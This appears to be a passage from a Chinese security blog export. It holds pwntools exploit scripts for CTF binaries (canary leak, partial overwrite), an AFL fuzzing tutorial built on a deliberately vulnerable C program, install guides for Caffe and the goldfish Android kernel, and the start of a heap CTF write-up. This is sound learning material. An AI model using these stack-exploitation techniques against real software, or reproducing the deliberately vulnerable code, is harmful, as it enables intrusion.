\")\nmyproc.sendline('aaa')\nmyproc.recv()\nmyproc.interactive()\n```\n\n## 题目4 栈上的partial overwrite\n\n### 2018-安恒杯-babypie\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyelf = ELF('./babypie')\nmyproc = process(myelf.path)\n\npayload1 = 'a'*(0x28+1)\n\n#leak canary\nmyproc.recvuntil(\"Input your Name:\")\nmyproc.send(payload1)\nmyproc.recvuntil('a'*0x29)\ncanary = u64('\\x00' + myproc.recv(7))\n\n#overwrite 1 byte\npayload2 = 'a'*0x28 + p64(canary) + 'a'*0x8 + '\\x3E'\n\nmyproc.recvuntil(\":\\n\")\nmyproc.send(payload2)\n\nmyproc.interactive()\n```\n\n\n\n### 2018-XNUCA-gets\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nfor i in range(0x1000): \n    myelf = ELF('./gets')\n    myproc = process(myelf.path)\n    try:\n        payload = 'a'*24 + p64(0x40059b)\n        payload += 'aaaaaaaa'*5 + p64(0x40059b)\n        payload += 'aaaaaaaa'*5 + p64(0x40059b)\n        payload += 'a' * 8 * 5 + '\\x26\\x02'\n        myproc.sendline(payload)\n        myproc.sendline('ls')\n        data = myproc.recv()\n        print data\n        myproc.interactive()\n        myproc.close()\n    except Exception:\n        myproc.close()\n        continue\n```","categories":["CTF"]},{"title":"afl","url":"/2020/06/30/afl/","content":"\n# 1 从一个test程序开始\n\n## 1.1 安装AFL\n\n首先，检查本地的clang和llvm是否安装，若未安装则安装一下\n\n```shell\nsudo apt-get install clang\nsudo apt-get install llvm\n```\n\n以上环境确认好后，下载并安装AFL\n\n```shell\nwget http://lcamtuf.coredump.cx/afl/releases/afl-2.52b.tgz\ntar -zxvf afl-2.52b.tgz\ncd afl-2.52b\nmake\nsudo make install\n```\n\n以上操作做完，AFL就算是安装完毕啦。现在来看看AFL安装前后代码目录中文件的差别。以下先是安装前的目录：\n\n```shell\ndrwxr-xr-x 10  500  500   4096 Nov  5  2017 .\ndrwxr-xr-x  3 root root   4096 Jun  2 09:49 ..\n-rw-r--r--  1  500  500  23755 Nov  5  2017 afl-analyze.c\n-rw-r--r--  1  500  500  15273 Nov  5  2017 afl-as.c\n-rw-r--r--  1  500  500  21090 Nov  5  2017 afl-as.h\n-rwxr-xr-x  1  500  500  11392 Nov  5  2017 afl-cmin\n-rw-r--r--  1  500  500 206076 Nov  5  2017 afl-fuzz.c\n-rw-r--r--  1  500  500   8597 Nov  5  2017 afl-gcc.c\n-rw-r--r--  1  500  500   5336 Nov  5  2017 afl-gotcpu.c\n-rwxr-xr-x  1  500  500   4913 Nov  5  2017 afl-plot\n-rw-r--r--  1  500  500  16527 Nov  5  2017 afl-showmap.c\n-rw-r--r--  1  500  500  25235 Nov  5  2017 afl-tmin.c\n-rwxr-xr-x  1  500  500   3655 Nov  5  2017 afl-whatsup\n-rw-r--r--  1  500  500  12565 Nov  5  2017 alloc-inl.h\n-rw-r--r--  1  500  500  11216 Nov  5  2017 config.h\n-rw-r--r--  1  500  500   6574 Nov  5  2017 debug.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 dictionaries\ndrwxr-xr-x  4  500  500   4096 Nov  5  2017 docs\ndrwxr-xr-x 12  500  500   4096 Nov  5  2017 experimental\n-rw-r--r--  1  500  500   2065 Nov  5  2017 hash.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libdislocator\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libtokencap\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 llvm_mode\n-rw-r--r--  1  500  500   6987 Nov  5  2017 Makefile\ndrwxr-xr-x  3  500  500   4096 Nov  5  2017 qemu_mode\nlrwxrwxrwx  1  500  500     24 Nov  5  2017 QuickStartGuide.txt -> docs/QuickStartGuide.txt\nlrwxrwxrwx  1  500  500     11 Nov  5  2017 README -> docs/README\ndrwxr-xr-x  6  500  500   4096 Nov  5  2017 testcases\n-rw-r--r--  1  500  500    789 Nov  5  2017 test-instr.c\n-rw-r--r--  1  500  500   2292 Nov  5  2017 types.h\n```\n\n安装完成后，代码目录中的文件\n\n```shell\ndrwxr-xr-x 10  500  500   4096 Jun  2 09:47 .\ndrwxr-xr-x  7 root root   4096 Jun  1 18:42 ..\n-rwxr-xr-x  1 root root  90792 Jun  2 09:46 afl-analyze\n-rw-r--r--  1  500  500  23755 Nov  5  2017 afl-analyze.c\n-rwxr-xr-x  1 root root  50808 Jun  2 09:46 afl-as\n-rw-r--r--  1  500  500  15273 Nov  5  2017 afl-as.c\n-rw-r--r--  1  500  500  21090 Nov  5  2017 afl-as.h\nlrwxrwxrwx  1 root root      7 Jun  2 09:46 afl-clang -> afl-gcc\nlrwxrwxrwx  1 root root      7 Jun  2 09:46 afl-clang++ -> afl-gcc\n-rwxr-xr-x  1  500  500  11392 Nov  5  2017 afl-cmin\n-rwxr-xr-x  1 root root 582872 Jun  2 09:46 afl-fuzz\n-rw-r--r--  1  500  500 206076 Nov  5  2017 afl-fuzz.c\nlrwxrwxrwx  1 root root      7 Jun  2 09:46 afl-g++ -> afl-gcc\n-rwxr-xr-x  1 root root  35376 Jun  2 09:46 afl-gcc\n-rw-r--r--  1  500  500   8597 Nov  5  2017 afl-gcc.c\n-rwxr-xr-x  1 root root  32240 Jun  2 09:46 afl-gotcpu\n-rw-r--r--  1  500  500   5336 Nov  5  2017 afl-gotcpu.c\n-rwxr-xr-x  1  500  500   4913 Nov  5  2017 afl-plot\n-rwxr-xr-x  1 root root  76840 Jun  2 09:46 afl-showmap\n-rw-r--r--  1  500  500  16527 Nov  5  2017 afl-showmap.c\n-rwxr-xr-x  1 root root 106280 Jun  2 09:46 afl-tmin\n-rw-r--r--  1  500  500  25235 Nov  5  2017 afl-tmin.c\n-rwxr-xr-x  1  500  500   3655 Nov  5  2017 afl-whatsup\n-rw-r--r--  1  500  500  12565 Nov  5  2017 alloc-inl.h\nlrwxrwxrwx  1 root root      6 Jun  2 09:46 as -> afl-as\n-rw-r--r--  1  500  500  11216 Nov  5  2017 config.h\n-rw-r--r--  1  500  500   6574 Nov  5  2017 debug.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 dictionaries\ndrwxr-xr-x  4  500  500   4096 Nov  5  2017 docs\ndrwxr-xr-x 12  500  500   4096 Nov  5  2017 experimental\n-rw-r--r--  1  500  500   2065 Nov  5  2017 hash.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libdislocator\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libtokencap\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 llvm_mode\n-rw-r--r--  1  500  500   6987 Nov  5  2017 Makefile\ndrwxr-xr-x  3  500  500   4096 Nov  5  2017 qemu_mode\nlrwxrwxrwx  1  500  500     24 Nov  5  2017 QuickStartGuide.txt -> docs/QuickStartGuide.txt\nlrwxrwxrwx  1  500  500     11 Nov  5  2017 README -> docs/README\ndrwxr-xr-x  6  500  500   4096 Nov  5  2017 testcases\n-rw-r--r--  1  500  500    789 Nov  5  2017 test-instr.c\n-rw-r--r--  1  500  500   2292 Nov  5  2017 types.h\n```\n\n可以看到afl安装后，文件夹下多了些二进制文件，是不是很简单。但是，在使用AFL进行fuzz测试前，一定要设置一下**core_pattern**，否则会报错哦。\n\n```shell\nroot@x:~/afl-test# cat /proc/sys/kernel/core_pattern\n|/usr/share/apport/apport %p %s %c %d %P\nroot@x:~/afl-test# echo core > /proc/sys/kernel/core_pattern\nroot@x:~/afl-test# cat /proc/sys/kernel/core_pattern\ncore\n```\n\n## 1.2 跑起来看看\n\n测试程序的代码使用了先知社区的示例代码，如下。平时我们编译c代码使用的是gcc，现在为了使用AFL进行fuzz，我们必须使用1.1节中编译出来的afl-gcc对目标代码进行插桩编译。\n\n```c\n#include <stdio.h> \n#include <stdlib.h> \n#include <unistd.h> \n#include <string.h> \n#include <signal.h> \n\nint vuln(char *str)\n{\n    int len = strlen(str);\n    if(str[0] == 'A' && len == 66)\n    {\n        raise(SIGSEGV);\n        //如果输入的字符串的首字符为A并且长度为66，则异常退出\n    }\n    else if(str[0] == 'F' && len == 6)\n    {\n        raise(SIGSEGV);\n        //如果输入的字符串的首字符为F并且长度为6，则异常退出\n    }\n    else\n    {\n        printf(\"it is good!\\n\");\n    }\n    return 0;\n}\n\nint main(int argc, char *argv[])\n{\n    char buf[100]={0};\n    gets(buf);//存在栈溢出漏洞\n    printf(buf);//存在格式化字符串漏洞\n    vuln(buf);\n\n    return 0;\n}\n```\n\n接下来，需要做以下三件事：\n\n（1）使用afl-gcc编译目标代码（即插桩）\n\n```shell\n$ afl-gcc test.c -g -o test\n```\n\n（2）新建测试用例（测试用例即待测程序的输入，可以随意给个文件作为起始用例。AFL会在此用例的基础上进行变异，好的测试用例有助于更快发现更多bug）\n\n```shell\n$ mkdir testcase\n$ cd testcase\n$ vim file123\n\t123\n\tqwe\n```\n\n（3）输出文件夹（发现的bug等信息会输出到该目录下）\n\n```shell\n$ mkdir output\n```\n\n最后，指定好以上三项的位置，执行如下命令，就会进入AFL主面板开始fuzz啦\n\n```shell\nafl-fuzz -i testcase/ -o output/ ./test\n```\n\n这里给一下我fuzz完成后（ctrl +c）的情况：\n\n```shell\nroot@x:~/afl-test# afl-fuzz -i testcase/ -o output/ ./test\nafl-fuzz 2.52b by <lcamtuf@google.com>\n[+] You have 8 CPU cores and 1 runnable tasks (utilization: 12%).\n[+] Try parallel jobs - see /usr/local/share/doc/afl/parallel_fuzzing.txt.\n[*] Checking CPU core loadout...\n[+] Found a free CPU core, binding to #0.\n[*] Checking core_pattern...\n[*] Setting up output directories...\n[+] Output directory exists but deemed OK to reuse.\n[*] Deleting old session data...\n[+] Output dir cleanup successful.\n[*] Scanning 'testcase/'...\n[+] No auto-generated dictionary tokens to reuse.\n[*] Creating hard links for all input files...\n[*] Validating target binary...\n[*] Attempting dry run with 'id:000000,orig:file1'...\n[*] Spinning up the fork server...\n[+] All right - fork server is up.\n    len = 8, map size = 5, exec speed = 306 us\n[+] All test cases processed.\n\n[+] Here are some useful stats:\n\n    Test case count : 1 favored, 0 variable, 1 total\n       Bitmap range : 5 to 5 bits (average: 5.00 bits)\n        Exec timing : 306 to 306 us (average: 306 us)\n\n[*] No -t option specified, so I'll use exec timeout of 20 ms.\n[+] All set and ready to roll!\n\n                        american fuzzy lop 2.52b (test)\n\n┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐\n│        run time : 0 days, 0 hrs, 24 min, 9 sec       │  cycles done : 2574   │\n│   last new path : 0 days, 0 hrs, 24 min, 9 sec       │  total paths : 3      │\n│ last uniq crash : 0 days, 0 hrs, 14 min, 10 sec      │ uniq crashes : 6      │\n│  last uniq hang : none seen yet                      │   uniq hangs : 0      │\n├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤\n│  now processing : 2 (66.67%)        │    map density : 0.01% / 0.01%         │\n│ paths timed out : 0 (0.00%)         │ count coverage : 1.00 bits/tuple       │\n├─ stage progress ────────────────────┼─ findings in depth ────────────────────┤\n│  now trying : splice 9              │ favored paths : 3 (100.00%)            │\n│ stage execs : 47/48 (97.92%)        │  new edges on : 3 (100.00%)            │\n│ total execs : 5.41M                 │ total crashes : 385k (6 unique)        │\n│  exec speed : 3330/sec              │  total tmouts : 1 (1 unique)           │\n├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤\n│   bit flips : 0/128, 0/125, 0/119                   │    levels : 2          │\n│  byte flips : 0/16, 0/13, 0/7                       │   pending : 0          │\n│ arithmetics : 2/896, 0/129, 0/9                     │  pend fav : 0          │\n│  known ints : 0/78, 0/339, 0/308                    │ own finds : 2          │\n│  dictionary : 0/0, 0/0, 0/0                         │  imported : n/a        │\n│       havoc : 4/2.31M, 2/3.09M                      │ stability : 100.00%    │\n│        trim : 83.10%/16, 0.00%                      ├────────────────────────┘\n^C────────────────────────────────────────────────────┘          [cpu000: 23%]\n\n+++ Testing aborted by user +++\n[+] We're done here. Have a nice day!\n```\n\n## 1.3 分析结果\n\nfuzz完成后，根据AFL面板的信息我们知道有6个crash，因此我们进入output目录去分析\n\n```shell\nroot@x:~/afl-test/output# ls -al\ntotal 108\ndrwxr-xr-x 5 root root  4096 Jun  2 10:15 .\ndrwxr-xr-x 4 root root  4096 Jun  2 10:08 ..\ndrwx------ 2 root root  4096 Jun  2 10:25 crashes\n-rw------- 1 root root     1 Jun  2 10:39 .cur_input\n-rw------- 1 root root 65536 Jun  2 10:16 fuzz_bitmap\n-rw------- 1 root root   739 Jun  2 10:39 fuzzer_stats\ndrwx------ 2 root root  4096 Jun  2 10:15 hangs\n-rw------- 1 root root 15250 Jun  2 10:39 plot_data\ndrwx------ 3 root root  4096 Jun  2 10:15 queue\n```\n\n- crashes/ 文件夹中存放了fuzz过程中产生的crash样例\n\n- hangs/ 文件夹中存放了fuzz过程中产生的超时样例\n\n- queue/ 文件夹中存放了fuzz过程中不同执行路径的测试用例\n\n使用`xxd`命令查看产生的6个crash样例，然后可以将样例作为输入用gdb调试test程序。\n\n```shell\nroot@x:~/afl-test/output/crashes# xxd id:000000,sig:06,src:000000,op:havoc,rep:64\n00000000: 1f20 0820 fe1f 2004 0020 200c 0064 1ffe  . . .. ..  ..d..\n00000010: 017f 2033 ff20 2000 180b 2020 2008 20e2  .. 3.  ...   . .\n00000020: 1f20 e21f ff01 00ff ff20 2020 2002 0024  . .......    ..$\n00000030: ff00 0000 0000 0100 203a 200c 20e2 1f01  ........ : . ...\n00000040: 2020 0019 0110 510b 2020 2002 0020 2020    ....Q.   ..\n00000050: 2020 2020 2020 2020 2020 2020 2020 2020\n00000060: 2020 2020 2020 2020 2020 2020 2020 0820                .\n00000070: 2020 0c20 e21f 2002 7f80 2020 6b20 0101    . .. ...  k ..\n00000080: 0101 0101 1d01 0101 0101 0101 0101 0101  ................\n00000090: 0101 0101 0101 0101 0101 0101 40ff 2080  ............@. .\nroot@x:~/afl-test/output/crashes# xxd id:000001,sig:11,src:000002,op:arith8,pos:0,val:-28\n00000000: 4662 6262 627f 001a                      Fbbbb...\nroot@x:~/afl-test/output/crashes# xxd id:000002,sig:06,src:000002,op:havoc,rep:128\n00000000: 3685 c13e 3e3e 002f 3e3e 203e 3e6a 3e3e  6..>>>./>> >>j>>\n00000010: 3ee4 343e 3e3e 3e53 3d5b 146a 3e3e 2e3e  >.4>>>>S=[.j>>.>\n00000020: 3e3e 3e4e 3e6a 3e5c 273e 3e3e 3e3e 6a3e  >>>N>j>\\'>>>>>j>\n00000030: 3e8c 3e3e 3e3e 4a3e 6a3e 3e27 d9c5 a8c5  >.>>>>J>j>>'....\n00000040: 5314 533e 3e1d 3e3e 3e3e 3e3e 3e3e 3e3e  S.S>>.>>>>>>>>>>\n00000050: 3e3e 3e3e 3e3e 3e3e 3e3e 3e3e 3e3e 3e3e  >>>>>>>>>>>>>>>>\n00000060: 3e3e 3e3e 3e2f 3e3e 343e 3e6a 3e3e 0080  >>>>>/>>4>>j>>..\n00000070: 3e3e 3e27 fb9c 9c9c 9c9c 9c9c 9c9c c5c5  >>>'............\n00000080: c5a6 c5e0 7fff                           ......\nroot@x:~/afl-test/output/crashes# xxd id:000003,sig:06,src:000001+000002,op:splice,rep:4\n00000000: 2532 6e5a 627f fc19                      %2nZb...\nroot@x:~/afl-test/output/crashes# xxd id:000004,sig:06,src:000001,op:havoc,rep:128\n00000000: 4106 00f2 5fdf 03a0 c5f6 dfdf 40a0 dff4  A..._.......@...\n00000010: f5ff e5f4 f4fe 04f5 f4f4 f4f4 f4f4 f4f4  ................\n00000020: 0ef5 f4ff 800d f4b4 f400 f4f4 0edb eadf  ................\n00000030: f8df dfe7 f400 eadd dfe7 df02 dff8 00d7  ................\n00000040: dfdf 01df dfdf ecdb eadf f8df dfe7 dfdf  ................\n00000050: dff8 1ad7 dfdf 01da dfdf dedf dfdf dfdf  ................\n00000060: dfdf dfdf dfdf dfdf dfdf dfde dfdf dfde  ................\n00000070: ed00 e3e3 e316 0d00 0000 1000 00c0 dfe7  ................\n00000080: dfdf df00 d701 dfd6 0e                   .........\nroot@x:~/afl-test/output/crashes# xxd id:000005,sig:11,src:000002+000001,op:splice,rep:16\n00000000: 4132 800f fe0f 0f0f 0f0f 220f 0f0f 0f0f  A2........\".....\n00000010: 0f0f 0f0f 0f0f 0f0f 0f0f 0ef0 0f22 0f0f  .............\"..\n00000020: 0f0f 0f0f 0f0f 0f0f 0f0f 0f0f 0f0f 0f0f  ................\n00000030: 0f0f 0f0f 0f0f 0f0f 0f0f 0f7f ff64 0f0f  .............d..\n00000040: fc0e 000f 0f0f 0f0f 0fff                 ..........\n```\n\n## 1.4 继续已停止的fuzz测试\n\n```shell\nafl-fuzz -i- -o output ./test\n```\n\n## 1.5 结合ASAN的fuzz\n\n> ASAN只推荐在32位机器上使用。如果在64位机器上使用，也需将AFL编译成32位的。\n\n ```\nMethod 1. set AFL_USE_ASAN=1 before calling ‘make clean all’\nMethod 2. add -fsanitize=address option into makefile\n ```\n\n## 1.6 文件fuzz\n\n> 1.2和1.3节讲的是从stdin读取输入的目标程序，这里补充一下从文件读取输入的目标程序，以 `readelf -a xxfile` 为例。\n\n有源码插桩：\n\n```\nafl-fuzz -i in/ -o out/ ./readelf -a @@\n```\n\n无源码插桩：\n\n```\nafl-fuzz -i in/ -o out/ -Q ./readelf -a @@\n```\n\n\n\n# 2 无源码AFL fuzz\n\n> 无源码时，即无法对源码使用功能afl-gcc/afl-g++进行插桩编译时，整个fuzz过程会变得异常缓慢。但确实没有源码的情况下可使用该方法。\n\n**步骤1**：编译支持无源码fuzz的AFL\n\n在afl源码目录下：\n\n```\ncd qemu_mode\n./build_qemu_support.sh\ncd ..\nmake install \n```\n\n**步骤2**：跟1.2和1.3节一样，只不过有两点差异：\n\n- 待测程序是未经afl-gcc插桩编译过的，如使用gcc编译\n\n- 执行afl-fuzz命令时多加了一个`-Q`参数\n\n```\nafl-fuzz -i testcase/ -o output/ -Q ./test\n```\n\n# 3 AFL文档学习\n\n\n\nafl面板介绍：\n\nhttps://lcamtuf.coredump.cx/afl/status_screen.txt\n\n\n\n# 4 参考文档\n\n[初探AFL-Fuzz](https://xz.aliyun.com/t/4314)\n\n[小白初学AFL(American Fuzzy Lop)](https://blog.csdn.net/weixin_39448417/article/details/99703723)\n\n[AFL文件变异一览](http://rk700.github.io/2018/01/04/afl-mutations/)\n\n[AFL(American Fuzzy Lop) Cautions](https://stfpeak.github.io/2017/06/12/AFL-Cautions/)","categories":["Fuzzing"]},{"title":"caffe的安装与使用","url":"/2020/06/30/caffe/","content":"\n# 1 caffe安装\n\n## 1.1 安装依赖\n虚拟机为ubuntu 16.04，仅cpu。\n按照官网安装相应依赖（https://caffe.berkeleyvision.org/install_apt.html），执行了一下几条命令：\n\n```shell\n通用依赖：\nsudo apt-get install libprotobuf-dev libleveldb-dev libsnappy-dev libopencv-dev libhdf5-serial-dev protobuf-compiler\nsudo apt-get install --no-install-recommends libboost-all-dev\n\nblas依赖：\nsudo apt-get install libatlas-base-dev\n\npython依赖：\nsudo apt-get install python-dev\n\n以下依赖不知是否必须安装：\nsudo apt-get install libgflags-dev libgoogle-glog-dev liblmdb-dev\n```\n\n## 1.2 源码安装\n源码地址：https://github.com/BVLC/caffe\n官网方法：https://caffe.berkeleyvision.org/installation.html#compilation\n参考中文链接：https://www.jianshu.com/p/8878d2bdaf99\n### 1.2.1 编译源码\n```shell\nunzip caffe-master.zip\ncd caffe-master\ncp Makefile.config.example Makefile.config\n```\n更改Makefile.config文件中，如下行：\n```shell\n`CPU_ONLY := 1`前的注释符“#”去掉\n将：\nINCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include\nLIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib\n修改为：\nINCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include /usr/include/hdf5/serial\nLIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib /usr/lib/x86_64-linux-gnu/hdf5/serial\n```\n执行如下三条命令完成安装：\n```shell\nsudo make all\nsudo make test\nsudo make runtest\n```\n### 1.2.2 python环境\n\n```shell\n安装pip：\nsudo apt-get install python-pip\n\n安装python借口依赖库：\nsudo apt-get install gfortran\ncd /home/bling/caffe-master/python\nfor req in $(cat requirements.txt); do pip install $req; done\n\n验证：\nsudo pip install -r requirements.txt\n\n设置环境变量：\nsudo vim ~/.bashrc\n\texport PYTHONPATH=/home/bling/caffe-master/python:$PYTHONPATH\nsource ~/.bashrc\n```\n\n安装pycaffe\n```shell\ncd /home/bling/caffe-master/\nsudo make pycaffe\n\n验证使用，进python环境，输入\nimport caffe\n```\n\n# 使用示例\nMNIST tutorial：\nhttps://caffe.berkeleyvision.org/gathered/examples/mnist.html\n\nreference ImageNet model tutorial：\nhttps://caffe.berkeleyvision.org/gathered/examples/imagenet.html","categories":["AI"]},{"title":"android模拟器goldfish环境搭建","url":"/2020/06/30/goldfish/","content":"\n# 1 环境准备\n\n## 1.1 硬件及主机系统\n\n- 使用AVD时需要硬件支持KVM。因此现在主机bios中将虚拟化设置开启。\n- x86架构的主机，安装了ubuntu16.04操作系统。\n\n检查系统是否支持虚拟化的两条命令：\n```shell\nkvm-ok\n\negrep -c '(vmx|svm)' /proc/cpuinfo\n```\n\n## 1.2 下载goldfish源码\n\n（1）在线方式 - 推荐\n\n访问如下官网，执行git clone将工程克隆到本地，之后可以根据需要选择不同内核版本进行编译。\n\nhttps://android.googlesource.com/kernel/goldfish.git\n\n（2）离线方式\n\n在官网中下载特定版本的goldfish内核tar包，到ubuntu中解压。\n\n## 1.3 安装java\n\n参考 安装java jdk的三种方式：https://blog.csdn.net/zbj18314469395/article/details/86064849\n\n## 1.4 配置交叉编译环境\n\n下载交叉编译器：https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/\n\n可在以上链接中选择不同的交叉编译器，32位或64位，根据实际情况下载\n\n下载到本地后，配置环境变量\n```shell\nvim ~/.bashrc\n\nexport PATH=xxx/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin:$PATH\nexport PATH=xxx/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin:$PATH\nexport CROSS_COMPILE=aarch64-linux-android-\n\nsource ~/.bashrc\n```\n\n## 1.5 安装linux版android studio\n\n（1）离线方式 - 推荐\n在android studio官网（https://developer.android.com/studio）下载包，本地解压后，进入`android-studio/bin/`目录执行`./studio.h`即可启动AS。\n\n（2）在线方式\n\nhttps://rotolo.dev/android-studio/\n\n```shell\nsudo apt-add-repository ppa:paolorotolo/android-studio \nsudo apt-get update\nsudo apt-get install android-studio\n```\n\n## 1.6 配置AS\n\n（1）有网络的情况\n\n配置AS的代理，直接连接google\n\n这种方式下的sdk，ndk，AVD system-image等等都可以在线下载，很方便。\n\n（2）没有网络的情况\n\n手工下载android sdk或者system images等等，按照这个网站的指导：https://my.oschina.net/u/862582/blog/349263\n\n另一个手工下载sdk参考：https://www.jianshu.com/p/86b9c57bf838\n\n手工下载ndk参考：https://www.jianshu.com/p/abdad7fd1367\n\n（3）配置ubuntu环境变量\n\n在sdk manager中将需要的组件下载完毕后，设置以下几个目录到环境变量中：sdk/emulator/platform-tools/ndk/avd\n\n```shell\nvim ~/.bashrc\n\nexport ANDROID_HOME=/xxx/xxx/android-sdk-linux\nexport PATH=$ANDROID_HOME/emulator:$PATH\nexport PATH=$ANDROID_HOME/platform-tools:$PATH\nexport PATH=$ANDROID_HOME/ndk/xxx:$PATH\nexport PATH=~/.android/avd:$PATH\n\nsource ~/.bashrc\n```\n\n## 1.7 使用emulator\n\n`android avd`命令可以启动android device manager\n\n`android -avd xxx `指定xxx镜像启动模拟器（使用AVD manager创建完虚拟设备后，在`~/.android/avd`目录下会有xxx.ini）\n\n模拟器相关命令参考：https://developer.android.com/studio/run/emulator-commandline?hl=zh-cn\n\n## 1.8 加载低版本kernel\n\n最新版的android studio和sdk均不支持加载版本<3.10的内核，想加载低版本内核做实验的话，可使用如下链接提供的sdk。\n\nhttp://dl.google.com/android/android-sdk_r24.4.1-linux.tgz\n\n`android` - 命令，启动android sdk管理器\n\n`android avd` - 命令，启动avd manager\n\n`emulator -avd xxx` - 命令，跟最新版相同\n\n# 2 编译goldfish内核\n\n假设git clone的goldfish工程在~/kernel/goldfish目录下\n\n```shell\ncd ~/kernel\ncp -r goldfish goldfish44\n## 创建一个out44目录，用来存放编译输出\nmkdir out44\ncd goldfish44\ngit branch -a\n## 从goldfish中拉出kernel4.4分支\ngit checkout -b android-goldfish-4.4-dev remotes/origin/android-goldfish-4.4-dev\n## ~/kernel/goldfish44/arch/arm64/configs目录下有编译配置文件defconfig和ranchu64_defconfig，我们使用ranchu64_defconfig\n## 在goldfish44目录下指定好配置文件\nmake ARCH=arm64 O=../out44 ranchu64_defconfig\nmake ARCH=arm64 O=../out44/ -j16\n```\n\n编译完成后，如果需要更改配置（如允许内核加载自定义ko模块），操作如下\n\n```shell\n## 在goldfish44目录下执行\n## 图形化配置内核选项\nmake ARCH=arm64 O=../out44/  menuconfig\n## 配置变化的时候执行清理一下\nmake mrproper\n## 开始编译\nmake ARCH=arm64 O=../out44/ -j16\n```\n\n编译生成的内核文件在如下目录：`~/kernel/out44/arch/arm64/boot/Image.gz`\n\n# 3 使用编译的内核启动avd虚拟设备\n\n执行以下命令以自编译的内核启动虚拟机\n```shell\nemulator -avd KernelTest -no-window -no-audio -show-kernel -kernel ~/work/kernel/out49/arch/arm64/boot/Image.gz -no-snapstorage\n```","categories":["Others"]},{"title":"calc heap","url":"/2020/06/25/calc-heap/","content":"\n# 1 分析\n\n[题目二进制](https://xuanxuanblingbling.github.io/assets/attachment/calc)\n\n写write up之前，要吐槽一下，这又是一道做得让我怀疑人生的题。前后拖了一个月才狠下心把这题终于终于做完了。一点一点积累，希望一年或者几年后能看到自己的进步。\n\n## 1.1 查看程序基本信息\n\n```shell\n$ file calc\ncalc: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=454ff27c25ea5028bffdcfaf81e1c178d5cbce3a, stripped\n$ checksec calc\n[*] '/mnt/hgfs/VMshare/calc/calc'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n```\n\n## 1.2 运行试试\n\n```shell\n$ ./calc\n> 1\n1\n> 3\n3\n> 1111\n1111\n> 2+2\ninvalid number\n> 2 + 3\n5\n```\n\n## 1.3 IDA逆向\n\n如下是IDA逆向出来，main函数中的主要代码，对这段代码进行分析。\n\n```c\n  v13 = __readgsdword(0x14u);\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stderr, 0, 2, 0);\n  dword_804D0B0 = sub_804A929();\t\t// 1\n  dword_804D0B4 = sub_804A8E9();\t\t// 2\n  dword_804D0AC = sub_804A8E9();\t\t// 3\n  v0 = sub_804A83F(\"add\", (int)sub_80494AA);\t//4\n  sub_804A946(dword_804D0B0, \"add\", v0);\t\t//5\n  v1 = sub_804A83F(\"sub\", (int)sub_8049C81);\t//6\n  sub_804A946(dword_804D0B0, \"sub\", v1);\t\t//7\n  v2 = sub_804A83F(\"mul\", (int)sub_8049A0E);\n  sub_804A946(dword_804D0B0, \"mul\", v2);\n  v3 = sub_804A83F(\"div\", (int)sub_8049DED);\n  sub_804A946(dword_804D0B0, \"div\", v3);\n  v4 = sub_804A83F(\"mod\", (int)sub_8049F90);\n  sub_804A946(dword_804D0B0, \"mod\", v4);\n  v5 = sub_804A83F(\"not\", (int)sub_804A135);\n  sub_804A946(dword_804D0B0, \"not\", v5);\n  v6 = sub_804A83F(\"int\", (int)sub_8049854);\n  sub_804A946(dword_804D0B0, \"int\", v6);\n  v7 = sub_804A83F(\"exit\", (int)sub_804A688);\n  sub_804A946(dword_804D0B0, \"exit\", v7);\n  v8 = sub_804A83F(\"equals\", (int)sub_804A3C2);\n  sub_804A946(dword_804D0B0, \"equals\", v8);\n  v9 = sub_804A83F(\"type\", (int)sub_804A61E);\n  sub_804A946(dword_804D0B0, \"type\", v9);\n  v10 = sub_804A83F(\"len\", (int)sub_804A308);\n  sub_804A946(dword_804D0B0, \"len\", v10);\n  while ( 1 )\t\t//8\n  {\n    memset(&s, 0, 0x100u);\n    printf(\"> \");\n    if ( !fgets(&s, 256, stdin) )\t\t//9\n      break;\n    v11 = strrchr(&s, '\\n');\t\t//10\n    if ( v11 )\n      *v11 = 0;\n    sub_8048BC1(&s);\t\t//11\n  }\n```\n\n### line 1 2 3 \n\n```c\n  dword_804D0B0 = sub_804A929();\t\t// 1\n  dword_804D0B4 = sub_804A8E9();\t\t// 2\n  dword_804D0AC = sub_804A8E9();\t\t// 3\n```\n\ndword_804D0B0，dword_804D0B4，dword_804D0AC都是bss段的变量，各占4个字节。这三个变量分别接受sub_804A929()和sub_804A8E9()这两个函数的返回值。下面我们来看看这两个函数。\n\n```shell\n.bss:0804D0AC dword_804D0AC   dd ?                   \n.bss:0804D0AC                                      \n.bss:0804D0B0 ; int dword_804D0B0\n.bss:0804D0B0 dword_804D0B0   dd ?                  \n.bss:0804D0B0                                        \n.bss:0804D0B4 dword_804D0B4   dd ?   \n```\n\n- sub_804A929()\n\n  这个函数只有一句`return calloc(0x10u, 1u)`，申请大小为0x10的堆空间，并将堆的地址返回给dword_804D0B0。\n\n- sub_804A8E9()\n\n  